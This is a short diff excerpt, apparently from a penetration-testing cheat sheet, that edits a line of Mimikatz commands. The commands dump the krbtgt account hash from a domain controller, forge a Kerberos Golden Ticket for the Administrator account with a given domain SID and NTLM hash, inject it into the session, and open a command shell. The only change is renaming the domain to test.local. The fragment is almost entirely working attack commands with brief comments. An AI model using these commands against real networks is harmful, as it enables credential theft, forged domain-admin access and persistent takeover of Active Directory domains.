@@ -357,7 +357,7 @@ lsadump::lsa /inject /name:krbtgt
 # we need following information from the output:
 # SID of the domain
 # NTLM hash of the krbtgt account
-kerberos::golden /User:Administrator /domain:KRUEMEL.keks /sid:S-1-5-21-3311685201-1443070845-3622335404 /krbtgt:3f5f8a614cf590401df166f81b87bf17 /id:500 /ptt
+kerberos::golden /User:Administrator /domain:test.local /sid:S-1-5-21-3311685201-1443070845-3622335404 /krbtgt:3f5f8a614cf590401df166f81b87bf17 /id:500 /ptt
 
 # next we want the golden ticket cmd
 misc::cmd
